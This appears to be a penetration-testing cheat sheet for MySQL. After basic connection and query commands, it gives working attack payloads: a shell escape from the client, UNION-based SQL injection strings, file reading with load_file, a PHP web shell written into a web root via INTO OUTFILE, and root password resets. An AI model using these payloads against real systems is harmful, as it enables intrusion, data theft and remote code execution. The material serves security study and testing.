# MySQL commands

MySQL is an open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL). 

Default port is 3306

```bash
$ 3306/tcp open  mysql
```

## Connect

Local, without password:

```bash
$ mysql -u root
```

Local, with password (if not given, will be asked):

```bash
$ mysql -u root -p <password>
```

Remote:

```bash
$ mysql -h <Hostname> -u root
```

## Basic mysql commands
```text
show databases;
use <database>;
show tables;
describe <table_name>;
```

```text
select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name
```

## Get a shell with the MySQL client user

```text
\! sh
```

## Basic MySQLi

```text
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
```

## Read & Write

```text
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
```

## Try to change MySQL root password

```text
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```text
mysql -u username -p < mycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```